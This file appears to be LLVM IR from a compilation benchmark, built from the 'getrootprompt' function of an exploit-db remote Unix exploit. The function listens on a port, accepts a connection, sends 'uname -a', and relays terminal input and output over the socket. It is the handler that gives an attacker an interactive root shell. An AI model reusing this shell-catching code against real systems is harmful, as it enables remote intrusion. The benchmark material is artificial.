; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22314.c_getrootprompt.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22314.c_getrootprompt.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [33 x i8] c"Error creating listening socket\0A\00", align 1
@LISTENPORT = common dso_local global i32 0, align 4
@INADDR_ANY = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [32 x i8] c"Error binding listening socket\0A\00", align 1
@.str.2 = private unnamed_addr constant [37 x i8] c"Error listening on listening socket\0A\00", align 1
@.str.3 = private unnamed_addr constant [37 x i8] c"Error accepting on listening socket\0A\00", align 1
@.str.4 = private unnamed_addr constant [10 x i8] c"uname -a\0A\00", align 1
@errno = common dso_local global i64 0, align 8
@EWOULDBLOCK = common dso_local global i64 0, align 8
@EAGAIN = common dso_local global i64 0, align 8
@.str.5 = private unnamed_addr constant [19 x i8] c"Connection closed\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @getrootprompt() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca [1024 x i8], align 16
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [1024 x i8], align 16
  %11 = load i32, i32* @AF_INET, align 4
  %12 = load i32, i32* @SOCK_STREAM, align 4
  %13 = call i32 @socket(i32 %11, i32 %12, i32 0)
  store i32 %13, i32* %1, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %17

15:                                               ; preds = %0
  %16 = call i32 @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str, i64 0, i64 0))
  br label %108

17:                                               ; preds = %0
  %18 = load i32, i32* @AF_INET, align 4
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 3
  store i32 %18, i32* %19, align 4
  %20 = load i32, i32* @LISTENPORT, align 4
  %21 = call i32 @htons(i32 %20)
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  store i32 %21, i32* %22, align 4
  %23 = load i32, i32* @INADDR_ANY, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 1
  %25 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %24, i32 0, i32 0
  store i32 %23, i32* %25, align 4
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 0
  %27 = call i32 @memset(i32* %26, i32 0, i32 8)
  %28 = load i32, i32* %1, align 4
  %29 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %30 = call i32 @bind(i32 %28, %struct.sockaddr* %29, i32 4)
  %31 = icmp eq i32 %30, -1
  br i1 %31, label %32, label %34

32:                                               ; preds = %17
  %33 = call i32 @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.1, i64 0, i64 0))
  br label %108

34:                                               ; preds = %17
  %35 = load i32, i32* %1, align 4
  %36 = call i32 @listen(i32 %35, i32 1)
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %40

38:                                               ; preds = %34
  %39 = call i32 @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.2, i64 0, i64 0))
  br label %108

40:                                               ; preds = %34
  store i32 16, i32* %2, align 4
  %41 = load i32, i32* %1, align 4
  %42 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %43 = call i32 @accept(i32 %41, %struct.sockaddr* %42, i32* %2)
  store i32 %43, i32* %3, align 4
  %44 = icmp eq i32 %43, -1
  br i1 %44, label %45, label %47

45:                                               ; preds = %40
  %46 = call i32 @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.3, i64 0, i64 0))
  br label %108

47:                                               ; preds = %40
  %48 = load i32, i32* %3, align 4
  %49 = call i32 @writesocket(i32 %48, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i64 0, i64 0))
  br label %50

50:                                               ; preds = %47, %74, %99, %107
  %51 = call i32 @FD_ZERO(i32* %8)
  %52 = call i32 @FD_SET(i32 0, i32* %8)
  %53 = load i32, i32* %3, align 4
  %54 = call i32 @FD_SET(i32 %53, i32* %8)
  %55 = load i32, i32* %3, align 4
  %56 = add nsw i32 %55, 1
  %57 = call i64 @select(i32 %56, i32* %8, i32* null, i32* null, i32* null)
  %58 = icmp ne i64 %57, 0
  br i1 %58, label %59, label %107

59:                                               ; preds = %50
  %60 = call i64 @FD_ISSET(i32 0, i32* %8)
  %61 = icmp ne i64 %60, 0
  br i1 %61, label %62, label %82

62:                                               ; preds = %59
  %63 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %64 = call i32 @read(i32 0, i8* %63, i32 1024)
  store i32 %64, i32* %9, align 4
  %65 = icmp slt i32 %64, 1
  br i1 %65, label %66, label %77

66:                                               ; preds = %62
  %67 = load i64, i64* @errno, align 8
  %68 = load i64, i64* @EWOULDBLOCK, align 8
  %69 = icmp eq i64 %67, %68
  br i1 %69, label %74, label %70

70:                                               ; preds = %66
  %71 = load i64, i64* @errno, align 8
  %72 = load i64, i64* @EAGAIN, align 8
  %73 = icmp eq i64 %71, %72
  br i1 %73, label %74, label %75

74:                                               ; preds = %70, %66
  br label %50

75:                                               ; preds = %70
  %76 = call i32 @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.5, i64 0, i64 0))
  br label %108

77:                                               ; preds = %62
  %78 = load i32, i32* %3, align 4
  %79 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %80 = load i32, i32* %9, align 4
  %81 = call i32 @write(i32 %78, i8* %79, i32 %80)
  br label %82

82:                                               ; preds = %77, %59
  %83 = load i32, i32* %3, align 4
  %84 = call i64 @FD_ISSET(i32 %83, i32* %8)
  %85 = icmp ne i64 %84, 0
  br i1 %85, label %86, label %106

86:                                               ; preds = %82
  %87 = load i32, i32* %3, align 4
  %88 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %89 = call i32 @read(i32 %87, i8* %88, i32 1024)
  store i32 %89, i32* %9, align 4
  %90 = icmp slt i32 %89, 1
  br i1 %90, label %91, label %102

91:                                               ; preds = %86
  %92 = load i64, i64* @errno, align 8
  %93 = load i64, i64* @EWOULDBLOCK, align 8
  %94 = icmp eq i64 %92, %93
  br i1 %94, label %99, label %95

95:                                               ; preds = %91
  %96 = load i64, i64* @errno, align 8
  %97 = load i64, i64* @EAGAIN, align 8
  %98 = icmp eq i64 %96, %97
  br i1 %98, label %99, label %100

99:                                               ; preds = %95, %91
  br label %50

100:                                              ; preds = %95
  %101 = call i32 @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.5, i64 0, i64 0))
  br label %108

102:                                              ; preds = %86
  %103 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %104 = load i32, i32* %9, align 4
  %105 = call i32 @write(i32 1, i8* %103, i32 %104)
  br label %106

106:                                              ; preds = %102, %82
  br label %107

107:                                              ; preds = %106, %50
  br label %50

108:                                              ; preds = %100, %75, %45, %38, %32, %15
  ret void
}

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @memset(i32*, i32, i32) #1

declare dso_local i32 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @listen(i32, i32) #1

declare dso_local i32 @accept(i32, %struct.sockaddr*, i32*) #1

declare dso_local i32 @writesocket(i32, i8*) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i64 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
